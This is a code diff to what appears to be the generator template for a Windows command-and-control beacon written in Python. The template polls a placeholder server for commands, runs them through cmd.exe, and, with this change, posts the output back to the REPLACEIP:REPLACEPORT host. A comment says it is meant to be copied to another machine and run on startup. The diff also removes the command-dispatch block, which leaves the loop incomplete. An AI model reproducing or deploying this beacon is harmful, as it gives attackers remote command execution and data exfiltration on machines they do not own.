@@ -2,11 +2,11 @@
 WINCMDEXEC = '''
 def GENERATEFUNC1(beacon_command):
     import subprocess
-    command = ['cmd.exe', '/C', beacon_command]
+    command = ['cmd.exe', '/c', beacon_command]
     process = subprocess.Popen(command, close_fds=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
     out, err = process.communicate()
     out = out.decode()
-    return out
+    requests.post('http://REPLACEIP:REPLACEPORT/schema', data=out, headers=headers)
 '''
 
 # This is the base for constructing our beacon
@@ -22,17 +22,7 @@ while 1:
     
     a = requests.get('REPLACEIP:REPLACEPORT', headers=headers)
     cmd = a.text
-    op = cmd.split(';')[0]
-    cm = cmd.split(';')[1]
-    ex = cmd.split(';')[2]
-    enc = cmd.split(';')[3]
 
-    if op == 'cmd':
-        returned = GENERATEFUNC1(cm)
-        response = requests.post('http://httpbin.org/post', data=returned, headers=headers)
-        print(response.request.url)
-        print(response.request.body)
-        print(response.request.headers)
 
     time.sleep(REPLACESLEEPINT)
 
@@ -46,7 +36,7 @@ def GENERATEFUNC1(beacon_command):
     process = subprocess.Popen(command, close_fds=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
     out, err = process.communicate()
     out = out.decode()
-    return out
+    requests.post('http://REPLACEIP:REPLACEPORT/schema', data=out, headers=headers)
 '''
 
 # The intention here is that you would copy this to another machine to execute on startup
